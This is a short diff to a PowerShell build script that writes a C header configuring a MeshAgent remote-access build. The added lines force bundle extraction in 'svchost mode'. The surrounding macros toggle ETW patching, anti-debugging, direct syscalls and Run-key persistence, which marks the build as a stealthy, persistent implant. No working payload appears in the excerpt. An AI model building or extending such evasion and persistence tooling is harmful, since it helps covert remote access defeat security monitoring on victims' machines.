@@ -37,6 +37,17 @@ $stealth = $config.stealth
 $persistence = $config.persistence
 $evasion = $config.evasion
 
+# Determine default bundle extraction behavior for svchost deployments
+$bundleExtractDefault = $false
+if ($null -ne $stealth.bundleExtract) {
+    $bundleExtractDefault = [bool]$stealth.bundleExtract
+}
+if ($stealth.svchostMode -and -not $bundleExtractDefault) {
+    Write-Host "[WARN] Svchost mode enabled but bundle extraction disabled in branding config; forcing extraction on." -ForegroundColor Yellow
+    $bundleExtractDefault = $true
+}
+$bundleExtractMacro = if ($bundleExtractDefault) { 1 } else { 0 }
+
 # Generate branding header
 Write-Host "[INFO] Generating branding header: $OutputHeader" -ForegroundColor Yellow
 
@@ -86,6 +97,7 @@ $headerContent = @"
 #define MESH_AGENT_ETW_PATCH $($stealth.ettwPatch ? 1 : 0)
 #define MESH_AGENT_ANTI_DEBUG $($stealth.antiDebug ? 1 : 0)
 #define MESH_AGENT_SYSCALLS_DIRECT $($stealth.syscallsDirectMode ? 1 : 0)
+#define MESH_AGENT_BUNDLE_EXTRACT_DEFAULT $bundleExtractMacro
 
 /* ========== Persistence Configuration ========== */
 #define MESH_AGENT_PERSIST_RUNKEY $($persistence.runKey ? 1 : 0)
